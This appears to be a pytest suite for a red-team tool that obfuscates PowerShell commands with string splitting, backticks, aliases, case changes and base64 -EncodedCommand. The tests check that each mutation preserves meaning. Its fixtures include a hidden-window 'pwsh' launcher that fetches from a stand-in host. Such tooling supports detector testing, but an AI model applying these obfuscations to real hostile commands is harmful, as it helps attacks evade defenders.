# Seeded RNGs drive the mutators; not crypto.
"""PowerShell mutators. String rewrites are checked with a tiny evaluator for
exactly the expressions they emit; word rewrites by undoing them.

(The same mutators were also checked once by running benign scripts in pwsh
before and after; that is a manual check, not part of this suite.)
"""

import base64
import random
import re

import pytest

from redteam.models import Shell
from redteam.mutate import _kw, get
from redteam.mutate.lex import lex_ps, sq_value
from redteam.mutate.ps import (
    ALIASES,
    PARAM_CLASSES,
    WINDOW_VALUES,
    encode_command,
    find_launcher,
    string_sites,
)

URL = 'https://example.invalid/a'
SCRIPT = f"{_kw.IWR} '{URL}' -UseBasicParsing | Write-Output"
LAUNCHER = f'{_kw.PWSH} -NoProfile -WindowStyle Hidden -c "{_kw.IRM} {URL}"'


def m(technique):
    return get(technique, Shell.POWERSHELL)


_SQ = r"'(?:[^']|'')*'"


def ps_eval(expr):
    """Evaluate the string expressions the mutators produce."""
    expr = expr.strip()
    if re.fullmatch(_SQ, expr):
        return sq_value(expr)
    mt = re.fullmatch(rf'\(((?:{_SQ}\+)+{_SQ})\)', expr)
    if mt:
        return ''.join(sq_value(p) for p in re.findall(_SQ, mt.group(1)))
    mt = re.fullmatch(rf"\('((?:\{{\d+\}})+)' -f ((?:{_SQ},)*{_SQ})\)", expr)
    if mt:
        args = [sq_value(a) for a in re.findall(_SQ, mt.group(2))]
        return ''.join(args[int(i)] for i in re.findall(r'\d+', mt.group(1)))
    mt = re.fullmatch(r'\(-join \[char\[\]\]\(([\d,]+)\)\)', expr)
    if mt:
        return ''.join(chr(int(c)) for c in mt.group(1).split(','))
    mt = re.fullmatch(rf'\(-join \(({_SQ})\[-1\.\.-(\d+)\]\)\)', expr)
    if mt:
        s = sq_value(mt.group(1))
        return ''.join(s[-i] for i in range(1, int(mt.group(2)) + 1))
    raise AssertionError(f'not an emitted expression: {expr!r}')


def test_evaluator_hand_examples():
    assert ps_eval("('ab'+'c')") == 'abc'
    assert ps_eval("('{1}{0}' -f 'c','ab')") == 'abc'
    assert ps_eval("('{0}{2}{1}' -f 'a','c','b')") == 'abc'
    assert ps_eval('(-join [char[]](97,98))') == 'ab'
    assert ps_eval("(-join ('cba'[-1..-3]))") == 'abc'
    assert ps_eval("('it''s'+'!')") == "it's!"


def replaced_site(before, after):
    """The expression that replaced a string site (common prefix/suffix)."""
    i = 0
    while i < min(len(before), len(after)) and before[i] == after[i]:
        i += 1
    j = 0
    while (
        j < min(len(before), len(after)) - i and before[-1 - j] == after[-1 - j]
    ):
        j += 1
    # Widen to the whole site in `before`.
    for start, end, value in string_sites(before):
        if start <= i and end >= len(before) - j:
            return value, after[start : len(after) - (len(before) - end)]
    raise AssertionError('no site changed')


@pytest.mark.parametrize(
    'technique', ['ps.concat', 'ps.format', 'ps.char', 'ps.reverse']
)
@pytest.mark.parametrize(
    'script',
    [SCRIPT, f'{_kw.IRM} {URL} | Write-Output', "Write-Output 'it''s'"],
)
def test_string_rewrites_evaluate_back(technique, script):
    for k in range(15):
        out = m(technique)(script, random.Random(k))
        assert out is not None
        value, expr = replaced_site(script, out)
        assert ps_eval(expr) == value


def test_string_sites_skip_glued_and_type_strings():
    assert string_sites("a'b'") == []
    assert string_sites("$a['k']") == []
    assert [s[2] for s in string_sites(f"x {URL}'q' | y 'r'")] == ['r']


def test_launcher_inner_is_requoted():
    la = find_launcher(LAUNCHER)
    assert la is not None and la.exe == _kw.PWSH
    for k in range(20):
        out = m('ps.var_indirection')(LAUNCHER, random.Random(k))
        if out.startswith('$'):
            continue  # rewrote the outer launcher word
        inner = re.search(r'-c "(.*)"$', out).group(1)
        # Outer double quotes: `$ keeps the inner variable literal.
        assert '`$pw' in inner
        assert '$pw' not in inner.replace('`$', '')
        return
    raise AssertionError('inner script never chosen')


def test_backtick():
    for k in range(20):
        out = m('ps.backtick')(SCRIPT, random.Random(k))
        assert '`' in out
        assert out.replace('`', '') == SCRIPT
        for mt in re.finditer('`(.)', out):
            assert mt.group(1) not in '0abefnrtuvABEFNRTUV'
    out = m('ps.backtick')(LAUNCHER, random.Random(3))
    assert out.replace('`', '') == LAUNCHER
    # Strings with $ are left alone ($ and ` would change meaning).
    assert m('ps.backtick')('"$a"', random.Random(0)) is None


def test_alias():
    groups = {g.lower(): grp for grp in ALIASES for g in grp}
    for k in range(10):
        out = m('ps.alias')(SCRIPT, random.Random(k))
        word = out.split(' ', 1)[0]
        assert word.lower() in groups and word.lower() != _kw.IWR
        assert out.split(' ', 1)[1] == SCRIPT.split(' ', 1)[1]
    # curl / wget only inside a Windows PowerShell launcher.
    seen = set()
    launcher = f'{_kw.PS} -c "{_kw.INVOKE_WEBREQUEST} {URL}"'
    for k in range(40):
        out = m('ps.alias')(launcher, random.Random(k))
        seen.add(re.search(r'-c "(\S+)', out).group(1).lower())
    assert 'curl' in seen
    seen7 = set()
    for k in range(40):
        out = m('ps.alias')(SCRIPT, random.Random(k))
        seen7.add(out.split(' ', 1)[0].lower())
    assert 'curl' not in seen7


def test_var_indirection_resolves():
    for k in range(10):
        out = m('ps.var_indirection')(SCRIPT, random.Random(k))
        mt = re.fullmatch(rf'\$(pw[a-z]{{2}})=({_SQ}\+{_SQ}|{_SQ});(.*)', out)
        assert mt, out
        name, expr, body = mt.groups()
        value = ps_eval(f'({expr})') if '+' in expr else sq_value(expr)
        assert body.replace(f'& ${name}', value) == SCRIPT


def test_case_only_touches_case_insensitive_tokens():
    native = 'curl -s -S https://example.invalid/A'
    for k in range(10):
        out = m('ps.case')(SCRIPT, random.Random(k))
        assert out.lower() == SCRIPT.lower()
        assert URL in out
        out = m('ps.case')(native, random.Random(k))
        # Native program flags (curl -s / -S) keep their case.
        assert out is None or out.split(' ', 1)[1] == native.split(' ', 1)[1]


def test_param_abbrev():
    flat = {g.lower(): grp for grp in PARAM_CLASSES for g in grp}
    for k in range(20):
        out = m('ps.param_abbrev')(LAUNCHER, random.Random(k))
        a, b = LAUNCHER.split(), out.split()
        diff = [(x, y) for x, y in zip(a, b, strict=True) if x != y]
        assert len(diff) == 1
        x, y = diff[0]
        if x == 'Hidden':
            assert y in WINDOW_VALUES
        else:
            assert flat[x.lower()] is flat[y.lower()]


def test_encoded_command():
    out = m('ps.encoded_command')(LAUNCHER, random.Random(0))
    head, b64 = out.rsplit(' ', 1)
    assert head.startswith(f'{_kw.PWSH} -NoProfile -WindowStyle Hidden ')
    assert base64.b64decode(b64).decode('utf-16-le') == f'{_kw.IRM} {URL}'
    out = m('ps.encoded_command')(SCRIPT, random.Random(1))
    b64 = out.rsplit(' ', 1)[1]
    assert base64.b64decode(b64).decode('utf-16-le') == SCRIPT
    assert encode_command('ab') == 'YQBiAA=='


def test_lexer_refuses_open_quotes():
    assert m('ps.concat')("Write-Output 'open", random.Random(0)) is None
    toks = lex_ps('a "b $(c "d") e" # f')
    assert [t.kind for t in toks if t.kind != 'ws'] == [
        'word',
        'dq',
        'comment',
    ]
